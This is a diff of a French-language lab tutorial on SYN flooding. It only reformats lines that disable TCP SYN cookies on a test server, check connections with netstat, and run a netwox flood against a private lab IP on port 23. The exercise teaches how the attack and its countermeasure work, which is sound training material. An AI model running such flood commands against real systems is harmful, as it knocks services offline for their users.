@@ -34,12 +34,13 @@ Sur le serveur "Server", nous devons désactiver une contre-mesure appelée cook
 
 user@Server:~$ sudo sysctl -w net.ipv4.tcp_syncookies=0
 
-Avant de lancer l'attaque, vérifions la situation des connexions sur le serveur
-user@Server:~$ netstat -tan -c
+Avant de lancer l'attaque, vérifions la situation des connexions sur le serveur:
+
+### user@Server:~$ netstat -tan -c
 
 L'attaquant utlise netwox pour inonder Server:
 
-sudo netwox 76 -i 192.168.180.153 -p 23 -s raw
+### sudo netwox 76 -i 192.168.180.153 -p 23 -s raw
 
 
 Observez l'état des connexions sur le Server:
